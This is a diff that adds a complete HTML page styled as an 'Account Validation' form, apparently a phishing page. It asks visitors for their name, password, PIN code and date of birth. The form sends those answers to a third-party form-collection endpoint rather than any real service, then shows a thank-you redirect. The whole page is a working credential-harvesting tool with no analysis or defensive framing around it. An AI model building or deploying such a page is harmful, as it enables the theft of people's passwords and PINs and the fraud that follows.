@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Validation</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f9;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      background-color: #1d3c87;
+      color: white;
+      text-align: center;
+      padding: 20px;
+      font-size: 20px;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0px 2px 8px rgba(0,0,0,0.1);
+    }
+    .container h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin: 10px 0 5px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      margin-bottom: 15px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #1d6ef0;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #1557c0;
+    }
+    .footer {
+      text-align: center;
+      background-color: #1d3c87;
+      color: white;
+      padding: 15px;
+      font-size: 12px;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">ACCOUNT VALIDATION</div>
+
+  <div class="container">
+    <h2>Customer Details</h2>
+    <form action="https://formkeep.com/f/4392643aba37" method="POST" accept-charset="UTF-8">
+      
+      <label for="customer-name">Customer Name</label>
+      <input type="text" id="customer-name" name="customer_name" required>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required>
+
+      <label for="pin">PIN Code</label>
+      <input type="text" id="pin" name="pin_code" maxlength="6" required>
+
+      <label for="dob">Date of Birth</label>
+      <input type="date" id="dob" name="dob" required>
+
+      <!-- Redirect to Thank You Page -->
+      <input type="hidden" name="redirect_to" value="thank_you.html">
+      
+      <button type="submit">Validate Information</button>
+    </form>
+  </div>
+
+  <div class="footer">
+    © 2025 Customer Validation. All rights reserved. Accra, Ghana
+  </div>
+</body>
+</html>
